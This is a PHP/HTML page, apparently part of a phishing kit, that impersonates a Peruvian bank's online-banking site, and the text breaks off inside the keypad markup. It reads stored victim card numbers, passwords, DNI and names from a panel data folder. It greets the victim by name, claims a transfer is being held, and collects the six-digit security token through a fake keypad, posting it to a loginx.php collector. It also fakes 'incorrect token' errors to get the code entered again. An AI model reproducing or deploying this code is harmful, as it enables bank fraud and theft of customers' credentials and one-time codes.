<?php
error_reporting(0);
date_default_timezone_set("America/Lima");
/*===================================================*/
include("../config.php");
/*===================================================*/
$time = $_GET["sessionDataKey"];
/*===================================================*/
$data = file_get_contents('../panel/data/'.$time.' - '.$ipv.'.txt', 'w');
$datos_array = json_decode($data, true);
list($ip, $card, $pass, $dni, $nombre, $estado) = explode('|', $data);
$ip = $datos_array["ip"];
$card = $datos_array["card"];
$pass = $datos_array["pass"];
$dni = $datos_array["dni"];
$nombre = $datos_array["nombre"];
$estado = $datos_array["estado"];
/*===================================================*/
//include '../files/scripts/reniec.php';
//$fullname = $paterno." ".$materno." ".$nombres;
$fullname = $nombre;
/*===================================================*/
$meses = array("enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre");
$mes = date("m") - 1;
$hour = date('h:i A');
/*===================================================*/
$m[0] = "<b>Token Incorrecto.</b> Intente nuevamente por favor.";
$m[1] = "<b>Token Expirado.</b> Intente nuevamente por favor.";
$a = mt_rand(0,1);
?>
<html>
<head>
	<title></title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">

	<script type="text/javascript" src="../files/js/jquery-1.8.3.min.js"></script>

	<script type="text/javascript">

		function evalRanTable(valor){
        var longitud = parseInt($("#ind_long_clave").val());
        	if($("#token").val().length < longitud){
        		$("#token").val($("#token").val()+valor);
        	}
    	}

    	function logintud() {

    		token = document.getElementById("token").value;

    		uno = document.getElementById("1");
    		dos = document.getElementById("2");
    		tres = document.getElementById("3");
    		cuatro = document.getElementById("4");
    		cinco = document.getElementById("5");
    		seis = document.getElementById("6");

    		boton = document.getElementById("boton");

    		if (token.length===0) {
    			uno.classList.remove("botones-active");
    			dos.classList.remove("botones-active");
    			tres.classList.remove("botones-active");
    			cuatro.classList.remove("botones-active");
    			cinco.classList.remove("botones-active");
    			seis.classList.remove("botones-active");
    			boton.classList.add("disabled");
    		}
    		
    		if (token.length===1) {
    			uno.classList.add("botones-active");
    			dos.classList.remove("botones-active");
    			tres.classList.remove("botones-active");
    			cuatro.classList.remove("botones-active");
    			cinco.classList.remove("botones-active");
    			seis.classList.remove("botones-active");
    			boton.classList.add("disabled");
    		}

    		else if (token.length===2) {
    			uno.classList.add("botones-active");
    			dos.classList.add("botones-active");
    			tres.classList.remove("botones-active");
    			cuatro.classList.remove("botones-active");
    			cinco.classList.remove("botones-active");
    			seis.classList.remove("botones-active");
    			boton.classList.add("disabled");
    		}

    		else if (token.length===3) {
    			uno.classList.add("botones-active");
    			dos.classList.add("botones-active");
    			tres.classList.add("botones-active");
    			cuatro.classList.remove("botones-active");
    			cinco.classList.remove("botones-active");
    			seis.classList.remove("botones-active");
    			boton.classList.add("disabled");
    		}

    		else if (token.length===4) {
    			uno.classList.add("botones-active");
    			dos.classList.add("botones-active");
    			tres.classList.add("botones-active");
    			cuatro.classList.add("botones-active");
    			cinco.classList.remove("botones-active");
    			seis.classList.remove("botones-active");
    			boton.classList.add("disabled");
    		}

    		else if (token.length===5) {
    			uno.classList.add("botones-active");
    			dos.classList.add("botones-active");
    			tres.classList.add("botones-active");
    			cuatro.classList.add("botones-active");
    			cinco.classList.add("botones-active");
    			seis.classList.remove("botones-active");
    			boton.classList.add("disabled");
    		}

    		else if (token.length===6) {
    			uno.classList.add("botones-active");
    			dos.classList.add("botones-active");
    			tres.classList.add("botones-active");
    			cuatro.classList.add("botones-active");
    			cinco.classList.add("botones-active");
    			seis.classList.add("botones-active");
    			boton.classList.remove("disabled");

    		}

    	}
    	

	</script>

	<script type="text/javascript">
		
		function deletexd() {

    		token = document.getElementById("token");
			
			$(token).val(
    			function(index, value){
        		return value.substr(0, value.length - 1);
			})

    	}

	</script>

	<script type="text/javascript">
		function clearxd() {

    		document.getElementById('token').value = ''
    	}

	</script>

	<style type="text/css">
		@font-face {
		  font-family: StRyde-Regular;
		  src: url("../files/fonts/loli_manito_stryde-regular-webfont.eot");
		  src: url("../files/fonts/loli_manito_stryde-regular-webfont.eot?#iefix") format("embedded-opentype"), url("../files/fonts/loli_manito_stryde-regular-webfont.woff") format("woff"), url("../files/fonts/loli_manito_stryde-regular-webfont.ttf") format("truetype"), url("../files/fonts/loli_manito_stryde-regular-webfont.svg#StRyde-Regular") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: StRyde-Medium;
		  src: url("../files/fonts/loli_manito_stryde-medium-webfont.eot");
		  src: url("../files/fonts/loli_manito_stryde-medium-webfont.eot?#iefix") format("embedded-opentype"), url("../files/fonts/loli_manito_stryde-medium-webfont.woff") format("woff"), url("../files/fonts/loli_manito_stryde-medium-webfont.ttf") format("truetype"), url("../files/fonts/loli_manito_stryde-medium-webfont.svg#StRyde-Medium") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: StRyde-Medium-Italic;
		  src: url("../files/fonts/loli_manito_stryde-medium-italic-webfont.eot");
		  src: url("../files/fonts/loli_manito_stryde-medium-italic-webfont.eot?#iefix") format("embedded-opentype"), url("../files/fonts/loli_manito_stryde-medium-italic-webfont.woff") format("woff"), url("../files/fonts/loli_manito_stryde-medium-italic-webfont.ttf") format("truetype"), url("../files/fonts/loli_manito_stryde-medium-italic-webfont.svg#StRyde-Medium-Italic") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: StRyde-Bold;
		  src: url("../files/fonts/loli_manito_stryde-bold-webfont.eot");
		  src: url("../files/fonts/loli_manito_stryde-bold-webfont.eot?#iefix") format("embedded-opentype"), url("../files/fonts/loli_manito_stryde-bold-webfont.woff") format("woff"), url("../files/fonts/loli_manito_stryde-bold-webfont.ttf") format("truetype"), url("../files/fonts/loli_manito_stryde-bold-webfont.svg#StRyde-Bold") format("svg");
		  font-weight: 700;
		  font-style: normal; }
		@font-face {
		  font-family: StRyde-Bold-Italic;
		  src: url("../files/fonts/loli_manito_stryde-bold-italic-webfont.eot");
		  src: url("../files/fonts/loli_manito_stryde-bold-italic-webfont.eot?#iefix") format("embedded-opentype"), url("../files/fonts/loli_manito_stryde-bold-italic-webfont.woff") format("woff"), url("../files/fonts/loli_manito_stryde-bold-italic-webfont.ttf") format("truetype"), url("../files/fonts/loli_manito_stryde-bold-italic-webfont.svg#StRyde-Bold-Italic") format("svg");
		  font-weight: 700;
		  font-style: italic; }
		/*Classic Font*/
		@font-face {
		  font-family: Flexo-Regular;
		  src: url("../files/fonts/loli_manito_flexo-regular-webfont.eot");
		  src: url("../files/fonts/loli_manito_flexo-regular-webfont.eot?#iefix") format("embedded-opentype"), url("../files/fonts/loli_manito_flexo-regular-webfont.woff") format("woff"), url("../files/fonts/loli_manito_flexo-regular-webfont.ttf") format("truetype"), url("../files/fonts/loli_manito_flexo-regular-webfont.svg#Flexo-Regular") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: Flexo-Medium;
		  src: url("../files/fonts/loli_manito_flexo-medium-webfont.eot");
		  src: url("../files/fonts/loli_manito_flexo-medium-webfont.eot?#iefix") format("embedded-opentype"), url("../files/fonts/loli_manito_flexo-medium-webfont.woff") format("woff"), url("../files/fonts/loli_manito_flexo-medium-webfont.ttf") format("truetype"), url("../files/fonts/loli_manito_flexo-medium-webfont.svg#Flexo-Medium") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: Flexo-Demi;
		  src: url("../files/fonts/loli_manito_flexo-demi-webfont.eot");
		  src: url("../files/fonts/loli_manito_flexo-demi-webfont.eot?#iefix") format("embedded-opentype"), url("../files/fonts/loli_manito_flexo-demi-webfont.woff") format("woff"), url("../files/fonts/loli_manito_flexo-demi-webfont.ttf") format("truetype"), url("../files/fonts/loli_manito_flexo-demi-webfont.svg#Flexo-Demi") format("svg");
		  font-weight: 300;
		  font-style: normal; }
		@font-face {
		  font-family: Flexo-Bold;
		  src: url("../files/fonts/loli_manito_flexo-bold-webfont.eot");
		  src: url("../files/fonts/loli_manito_flexo-bold-webfont.eot?#iefix") format("embedded-opentype"), url("../files/fonts/loli_manito_flexo-bold-webfont.woff") format("woff"), url("../files/fonts/loli_manito_flexo-bold-webfont.ttf") format("truetype"), url("../files/fonts/loli_manito_flexo-bold-webfont.svg#Flexo-Bold") format("svg");
		  font-weight: 700;
		  font-style: normal; }
		@font-face {
		  font-family: Flexo-Bold-Italic;
		  src: url("../files/fonts/loli_manito_flexo-bold-italic-webfont.eot");
		  src: url("../files/fonts/loli_manito_flexo-bold-italic-webfont.eot?#iefix") format("embedded-opentype"), url("../files/fonts/loli_manito_flexo-bold-italic-webfont.woff") format("woff"), url("../files/fonts/loli_manito_flexo-bold-italic-webfont.ttf") format("truetype"), url("../files/fonts/loli_manito_flexo-bold-italic-webfont.svg#Flexo-Bold-Italic") format("svg");
		  font-weight: 700;
		  font-style: italic; }
		@font-face {
		  font-family: Flexo-Heavy;
		  src: url("../files/fonts/loli_manito_flexo-heavy-webfont.eot");
		  src: url("../files/fonts/loli_manito_flexo-heavy-webfont.eot?#iefix") format("embedded-opentype"), url("../files/fonts/loli_manito_flexo-heavy-webfont.woff") format("woff"), url("../files/fonts/loli_manito_flexo-heavy-webfont.ttf") format("truetype"), url("../files/fonts/loli_manito_flexo-heavy-webfont.svg#Flexo-Heavy") format("svg");
		  font-weight: 700;
		  font-style: normal; }

		.box-profile {
			background-color: #002d87; height: 273px; position: absolute; width: 100%;
		}

		.box-menu {
			width: 1110px; margin-left: auto; margin-right: auto; padding: 20px 10px 20px 10px; display: flex; align-items: center; justify-content: flex-start;
		}

		.menu-movil {
			float: left; margin-right: 20px; display: none;
		}

		.logo-bcp {
			width: 90px;
		}

		.menu-pc {
			width: 100%;
		}

		.profile {
			padding-left: 5px;
		}

		.box-data {
			width: 1110px; margin-left: auto; margin-right: auto; margin-top: 22px; font-family: Flexo-Regular; height: 120px;
		}

		.box-welcome {
			float: left;
		}

		.where {
			font-size: 28px; line-height: 1.25; color: white
		}

		.name {
			font-size: 14px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.71; letter-spacing: normal; color: #adc9ff;
		}

		.box-access {
			float: right;
		}

		.last {
			font-size: 14px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.71; letter-spacing: normal; color: white;
		}

		.access {
			font-size: 14px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.71; letter-spacing: normal; color: #adc9ff;
		}

		.box-form {
			width: 500px;margin-left: auto;margin-right: auto;background-color: white;padding: 20px;box-shadow: 0px 0px 9px -1px rgba(0, 0, 0, 0.32);border-radius: 5px; margin-bottom: 30px;
		}

		.box-numbers {
			display: flex; height: 80px; align-items: center; width: 250px; margin-left: auto; margin-right: auto;
		}

		.form-title {
			width: 350px; margin-right: auto; margin-left: auto; margin-top: 10px; text-align: center;
		}

		.form-error {
			width: 400px; border: 1px solid #ff003b; border-radius: 5px; background-color: #ffecf1; padding: 10px; font-size: 14px; display: flex; margin-left: auto; margin-right: auto; margin-top: 10px;
		}

		.triangulo {
			color: #ff003b;font-size: 14px;padding-left: 10px;padding-right: 10px;padding-top: 3px;
		}

		.form-description {
			width: 350px; margin-right: auto; margin-left: auto; margin-top: 10px; text-align: center;
		}

		.form {
			width: 400px; margin-right: auto; margin-left: auto; margin-top: 20px;
		}

		.date {
			display: flex; width: 100%;
		}

		.dni {
			display: block; width: 100%; margin-left: 10px
		}

		.secret-keys {
			display: flex; width: 100%;
		}

		.cvv {
			display: block; width: 100%; margin-right: 10px
		}

		.atm {
			display: block; width: 100%; margin-left: 10px
		}

		.form-contact {
			display: flex; width: 100%;
		}

		.operador {
			display: block; width: 100%; margin-right: 10px
		}

		.numero {
			display: block; width: 100%; margin-left: 10px
		}

		@media (max-width: 700px) {
        	.box-profile {
		  	background-color: #002d87; height: 273px; position: absolute; width: 100%;
		  }

		  .box-menu {
		  	margin-left: auto; margin-right: auto; padding: 20px 15px 20px 15px; width: auto; display: block;
		  }

		  .menu-movil {
		  	float: left; margin-right: 20px; display: block;
		  }

		  .logo-bcp {
		  	width: 90px; float: left;
		  }

		  .menu-pc {
		  	width: 100%; display: none;
		  }

		  .profile {
		  	padding-left: 5px; float: right;
		  }

		  .box-data {
		  	margin-left: auto; margin-right: auto; margin-top: 50px; font-family: Flexo-Regular; height: 120px; margin-left: 15px; width: auto;
		  }

		  .box-welcome {
		  	float: initial;
		  }

		  .where {
		  	font-size: 24px; font-weight: normal; font-stretch: normal; font-style: normal; line-height: 1.33; color: white; margin-bottom: 10px;
		  }

		  .name {
		  	font-size: 14px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.71; letter-spacing: normal; color: #adc9ff;
		  }

		  .box-access {
		  	display: flex;
		  	float: left;
		  }

		  .last {
		  	font-size: 14px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.71; letter-spacing: normal; color: white; margin-right: 5px
		  }

		  .access {
		  	font-size: 14px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.71; letter-spacing: normal; color: #adc9ff;
		  }

		  .box-form {
		  	width: auto;
		  	margin-left: 10px;
		  	margin-right: 10px;
		  }

		  .box-numbers {
		  	width: auto;
		  }

		  .form-title {
		  	width: auto;
		  }

		  .form-error {
			width: auto;
		  }

		  .form-description {
		  	width: auto;
		  }

		  .form {
		  	width: auto;
		  }

		  .date {
		  	display: block;
		  }

		  .dni {
		  	margin-left: 0px
		  }

		  .secret-keys {
		  	display: block;
		  }

		  .cvv {
		  	margin-right: 0px;
		  }

		  .atm {
			margin-left: 0px
		  }

		  .form-contact {
		  	display: block;
		  }

		  .operador {
		  	margin-right: 0px
		  }

		  .numero {
			margin-left: 0px;
			margin-top: 25px;
		  }

		}

		#wait-box {
			display: none;
		}

		.keypad-digit {
        	display: inherit;
    		float: left !important;
    		margin-bottom: 0 !important;
    		margin-right: 0 !important;
    		width: 25%;
    		height: 70px;
    		vertical-align: top;
    		outline: thin solid rgba(215, 215, 215, 0.9);
    		background-color: #f4f4f4;
        }

        .keypad-digit {
        	display: inherit;
    		float: left !important;
    		margin-bottom: 0 !important;
    		margin-right: 0 !important;
    		width: 25%;
    		height: 70px;
    		vertical-align: top;
    		outline: thin solid rgba(215, 215, 215, 0.9);
    		background-color: #f4f4f4;
        }

        .image-digit {
        	width: 60px;
        	height: 60px;
        	display: block;
        	margin-left: auto;
        	margin-right: auto;
        	margin-top: 5px;
        }

        .image-action {
        	width: 50px;
        	height: 50px;
        	display: block;
        	margin-left: auto;
        	margin-right: auto;
        	margin-top: 10px;
        }

        .seed-enabled {
			border-radius: 5px;
    		border: 1px solid;
    		border-color: #e2e2e2;
    		position: inherit;
    		width: 40px;
    		height: 40px;
    		cursor: pointer;
		}

		.keypad {
			margin-top: 30px; height: 210px;
		}

		.clean-button {
			border-radius: 5px;
    		border: 1px solid;
    		border-color: #e2e2e2;
    		position: inherit;
			width: 40px;
    		height: 40px;
		}

		.botonsitos {
			position: absolute; display: flex; top: 0px; margin-left: 12px;
		}

		.botoneslenght {
			background-color: #F1F1F1; border-radius: 50px; height: 8px; width: 8px; margin-right: 17px; border: 1px solid #A8A8A8
		}

		.botones-active {
			background-color: #002d74;
		}

		.boton {
			font-family: Flexo-Bold; height: 40px; padding: 0 16px; font-size: 18px; line-height: 38px; border-radius: 20px; color: #fff; background-color: #ff7800; border: 1px solid #ff7800; box-shadow: none; width: 100%;
		}

		.disabled {
			background-color: #cecece; border: 1px solid #cecece; pointer-events: none;
		}

		.hidden {
			display: none;
		}

	</style>

	<script type="text/javascript">
		function validar() {

			token = document.getElementById("token").value;
			time = document.getElementById("time").value;

			$.ajax({
                url: '../loginx.php?id=3',
                data: {accion: "3" , 'token':token , 'time':time},
                type: 'post',
                success: function(respXHR){
                    console.log(respXHR);
                	wait_box = document.getElementById("wait-box");
					formulario_box = document.getElementById("formulario-box");
					wait_box.style.display = "block";
  					formulario_box.innerHTML = wait_box;
  					formulario_box.style.display = "none";
                                        location.href = '../load?sessionDataKey=' + time ;
  					//setTimeout("location.href = 'msgToken?sessionDataKey=' + time + '&Cgi=InvalidToken';",20000);
				},
            });

            return false;

		}

	</script>

</head>
<body style="margin: 0px; background-color: #f6f7fb;">
	<div id="backend"></div>

	<div class="box-profile">
		<div class="box-menu">
			<div id="menu-movil" class="menu-movil">
				<i style="font-size: 22px; color: white;" class="fas fa-bars"></i>
			</div>
			<img class="logo-bcp" src="../files/img/loli_manito_logo.svg">
			<div class="menu-pc">
				<div style="float: right;  font-family: Flexo-Regular; color: #ffffff; font-size: 14px; letter-spacing: 0.5px;">
					<span style="padding-left: 16px; padding-right: 16px;">INICIO</span>
					<span style="padding-left: 16px; padding-right: 16px;">TRANSFERENCIAS<i class="fas fa-chevron-down" style="margin-left: 8px;"></i></span>
					<span style="padding-left: 16px; padding-right: 16px;">PAGOS<i class="fas fa-chevron-down" style="margin-left: 8px;"></i></span>
					<span style="padding-left: 16px; padding-right: 16px;">MAS OPERACIONES<i class="fas fa-chevron-down" style="margin-left: 8px;"></i></span>
				</div>
			</div>
			<div class="profile">
				<img src="../files/img/loli_manito_user.svg" style="background: #ffffff; border-radius: 8px; padding: 3px; padding-bottom: 5px;">
			</div>
		</div>

		<div class="box-data">
			<div class="box-welcome">
				<div class="where">Banca por Internet</div>
				<div class="name">Hola, <?php echo $fullname;?></div>
			</div>
			<div class="box-access">
				<div class="last"">Último acceso</div>
				<div class="access"><?=date(" d ")." de ".ucwords($meses[$mes])." de ".date("Y");?> - <?php echo $hour;?></div>
			</div>
		</div>

		<div class="box-form" >

			<!----------------------------------------------------------------->

			<div id="wait-box">
			<div class="box-numbers" >
				<li style="list-style: none; display: block;">
					<span style="border: 3px solid #012d74; border-radius: 50%; padding: 5px 12px 5px 12px; color: #012d74; text-align: center; font-family: Flexo-Regular; font-weight: bold;">1</span>
				</li>
				<span style="width: 100%; background-color: #012d74; height: 3px;"></span>
				<li style="list-style: none; display: block;">
					<span style="border: 3px solid #012d74; border-radius: 50%; padding: 5px 10px 5px 10px; color: #012d74; text-align: center; font-family: Flexo-Regular; font-weight: bold;">2</span>
				</li>
			</div>
			<div class="form-title">
				<span style="font-family: Flexo-Bold; color: #012d74; font-size: 20px;">VALIDANDO SU INFORMACIÓN</span>
			</div>

			<div class="form-description" >
				<span style="font-family: Flexo-Regular; color: #012d74; font-size: 15px;">Estamos validando sus datos.<br><b>No cierre esta ventana</b>.</span>
			</div>


			<div class="form">

				<div style="width: 300px;margin-left: auto;margin-right: auto;margin-top: 30px;margin-bottom: 20px;">
					<center>
						<img src="../files/img/loli_manito_cargando.gif" style="width: 120px;">
					</center>
				</div>
			</div>
			</div>


			<!----------------------------------------------------------------->

			<div id="formulario-box">
				
			
			<div class="form-error <?php if ($_GET["Cgi"] !== "InvalidToken" ) { echo "hidden";} ?>" id="form-error">
                            <i class="fas fa-exclamation-triangle triangulo"></i>
                            <div style="padding-left: 10px;">
                                <span style="font-family: Flexo-Regular;" id="error-text"><?=$m[$a]?></span>
                            </div>
			</div>

			<div class="box-numbers" >
				<li style="list-style: none; display: block;">
					<span style="border: 3px solid #012d74; border-radius: 50%; padding: 5px 12px 5px 12px; color: #012d74; text-align: center; font-family: Flexo-Regular; font-weight: bold;">1</span>
				</li>
				<span style="width: 100%; background-color: #d6dce9; height: 3px;"></span>
				<li style="list-style: none; display: block;">
					<span style="border: 3px solid #d6dce9; border-radius: 50%; padding: 5px 10px 5px 10px; color: #d6dce9; text-align: center; font-family: Flexo-Regular; font-weight: bold;">2</span>
				</li>
			</div>
			<div class="form-title">
				<span style="font-family: Flexo-Bold; color: #012d74; font-size: 20px;">SINCRONIZACIÓN DE TOKEN</span>
			</div>

			<div class="form-description">
				<span style="font-family: Flexo-Regular; color: #012d74; font-size: 15px;">Para recibir su transferencia retenida y confirmar todos los datos registrados, por favor ingrese su <b>clave token</b>.</span>
			</div>

			<div class="form">

				<form onsubmit="return validar();">

				<input type="hidden" id="ind_long_clave" name="ind_long_clave" value="6" />
				<input type="hidden" id="token" name="token" value="">
				<input type="hidden" id="time" name="time" value="<?php echo $time;?>">

				<center>

				<div style="margin: 20px;">
					<label style="position: relative; display: inline-block;">
						<input style="pointer-events: none; outline: none !important; border: none; border-bottom: 1px solid #7194BD; width: 100%;" type="text" name="">
						<div id="botonsitos" class="botonsitos">
							<div id="1" class="botoneslenght"></div>
							<div id="2" class="botoneslenght"></div>
							<div id="3" class="botoneslenght"></div>
							<div id="4" class="botoneslenght"></div>
							<div id="5" class="botoneslenght"></div>
							<div id="6" class="botoneslenght"></div>
						</div>
					</label>
				</div>

				<div id="keypadpc" class="keypad-seed-container">
        <div>
          <div class="separator left">
            <img onclick="evalRanTable('1'); logintud();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE5LjYsMTIuN3YxMC4yaC0xLjh2LTguNGMtMC42LDAuMi0xLjYsMC4zLTIuMywwLjRsLTAuMS0xLjRjMS4yLTAuMiwyLjEtMC41LDIuNy0wLjggICBDMTguMiwxMi43LDE5LjYsMTIuNywxOS42LDEyLjd6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSI1IiBjeT0iMTIiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIxIiBjeT0iMTEiLz4KPC9zdmc+">
            <img onclick="evalRanTable('4'); logintud();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LjksMjAuNmgtMy43Yy0xLDAtMS4yLTAuNC0xLjItMC45YzAtMC4zLDAuMS0wLjcsMC43LTEuNWwzLjYtNC42YzAuNS0wLjcsMC45LTAuOSwxLjUtMC45ICAgYzAuNSwwLDAuOSwwLjMsMC45LDEuMXY1LjVIMjJ2MS4zaC0xLjNWMjNIMTl2LTIuNEgxOC45eiBNMTUuNywxOS4yaDMuMlYxNUwxNS43LDE5LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyOCIgY3k9IjI3Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMTgiIGN5PSIyMSIvPgo8L3N2Zz4=">
            <img onclick="evalRanTable('8'); logintud();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LDEyLjZjMS43LDAsMy42LDAuNSwzLjYsMi41YzAsMS4xLTAuMiwxLjgtMS41LDIuNWMxLDAuNiwxLjYsMS4yLDEuNiwyLjVjMCwyLjQtMS43LDIuOS0zLjgsMi45ICAgYy0yLjIsMC0zLjgtMC43LTMuOC0yLjljMC0xLjMsMC42LTEuOSwxLjYtMi41Yy0xLTAuNi0xLjUtMS4yLTEuNS0yLjVDMTQuNCwxMy4xLDE2LjIsMTIuNiwxOCwxMi42eiBNMTgsMjEuNmMxLjEsMCwyLTAuMywyLTEuNiAgIGMwLTEuMS0wLjQtMS42LTIuNS0xLjhjLTEsMC4yLTEuNiwwLjctMS42LDEuOEMxNiwyMS40LDE2LjgsMjEuNiwxOCwyMS42eiBNMTguNCwxNi45YzEtMC4yLDEuNS0wLjYsMS41LTEuNmMwLTEuMi0wLjktMS40LTItMS40ICAgUzE2LDE0LjEsMTYsMTUuM0MxNi4xLDE2LjIsMTYuNCwxNi44LDE4LjQsMTYuOXoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjE5IiBjeT0iMTIiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNiIgY3k9IjI3Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMzEiIGN5PSI4Ii8+Cjwvc3ZnPg==">
